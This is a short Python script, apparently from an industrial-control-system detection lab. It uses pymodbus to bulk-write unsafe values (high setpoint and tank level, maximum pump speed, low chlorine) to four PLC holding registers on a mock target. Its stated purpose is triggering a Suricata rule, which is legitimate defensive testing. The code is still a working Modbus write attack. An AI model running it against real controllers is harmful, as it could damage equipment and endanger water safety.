"""
Attack: Modbus FC16 — Write Multiple Registers (bulk).
Overwrite Setpoint, TankLevel, PumpSpeed, ChlorineLevel in one go.

Bulk writes are particularly nasty because they push the PLC into
an inconsistent state in a single transaction.

Suricata rule sid:2000016 should fire.
"""
import sys
import time

from pymodbus.client import ModbusTcpClient

PLC = "mock-plc"

client = ModbusTcpClient(PLC, port=502, timeout=3)
if not client.connect():
    print(f"[ATTACK-FC16] could not connect to {PLC}:502")
    sys.exit(2)

values = [9999, 9999, 100, 50]   # bad setpoint, bad tank, max pump, low chlorine
wr = client.write_registers(address=0, values=values, slave=1)
if wr.isError():
    print(f"[ATTACK-FC16] write failed: {wr}")
    sys.exit(1)

print(f"[ATTACK-FC16] bulk-wrote HR0..3={values} — Suricata sid:2000016 should fire")
time.sleep(0.3)
client.close()
